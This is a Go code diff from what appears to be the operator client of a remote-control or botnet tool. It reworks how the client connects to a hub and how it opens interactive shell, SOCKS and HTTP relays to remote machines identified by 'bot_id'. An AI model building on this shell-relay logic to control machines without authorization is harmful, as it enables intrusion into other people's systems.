@@ -52,7 +52,13 @@ func main() {
 	admin.Private_ECDSA = private_ECDSA
 	admin.Public_ECDSA = public_ECDSA // not used
 
-	mux, err := admin.CreateConn(*huburl)
+	conn, err := net.Dial("tcp", *huburl)
+	if err != nil {
+		Vln(1, "connect err", err)
+		return
+	}
+
+	mux, err := admin.InitConn(conn)
 	if err != nil {
 		Vln(1, "connect err", err)
 		return
@@ -353,7 +359,7 @@ func opLocal(args []string) (exit bool, hasout bool, out string) {
 	// local bind bot_id bind_addr [socks|http|shell|shellk]
 	exit, hasout, out = false, true, `
 local ls
-local bind $bot_id $bind_addr [socks|http|sh|shk|sh2|call] [mode_argv...]
+local bind $bot_id $bind_addr [socks|http|sh|shk|call] [mode_argv...]
 local stop $bind_addr`
 
 	if len(args) < 1 {
@@ -469,36 +475,37 @@ func handleClient(admin *base.Auth, p0 net.Conn, id string, argv []string) {
 		}
 		defer p1.Close()
 
-		shell := []byte("bash")
-		if len(argv) > 1 {
-			//shell = []byte(strings.Join(argv[1:], " "))
-			shell = []byte(argv[1])
-			Vln(4, "[sh2]bin = ", string(shell))
-		}
-		kit.WriteVTagByte(p1, shell)
-
 		Vln(3, "[got]shellk", p0.RemoteAddr())
 		kit.Cp(p0, p1)
 		Vln(3, "[cls]shellk", p0.RemoteAddr())
 
-	case "sh2":
+	case "sh":
 		p1, err := admin.GetConn2Client(id, base.B_csh)
 		if err != nil {
 			return
 		}
 		defer p1.Close()
 
-		shell := []byte("bash")
+		shell := []byte("sh")
 		if len(argv) > 1 {
 			//shell = []byte(strings.Join(argv[1:], " "))
 			shell = []byte(argv[1])
-			Vln(4, "[sh2]bin = ", string(shell))
+			Vln(4, "[sh]bin = ", string(shell))
 		}
 		kit.WriteVTagByte(p1, shell)
 
-		Vln(3, "[got]sh2", p0.RemoteAddr())
+		keep := int64(0)
+		if len(argv) > 2 {
+			if argv[2] != "0" {
+				Vln(4, "[sh]keep = ", true)
+				keep = int64(1)
+			}
+		}
+		kit.WriteVLen(p1, keep)
+
+		Vln(3, "[got]sh", p0.RemoteAddr())
 		kit.Cp(p0, p1)
-		Vln(3, "[cls]sh2", p0.RemoteAddr())
+		Vln(3, "[cls]sh", p0.RemoteAddr())
 
 	case "call":
 		p1, err := admin.GetConn2Client(id, base.B_call)
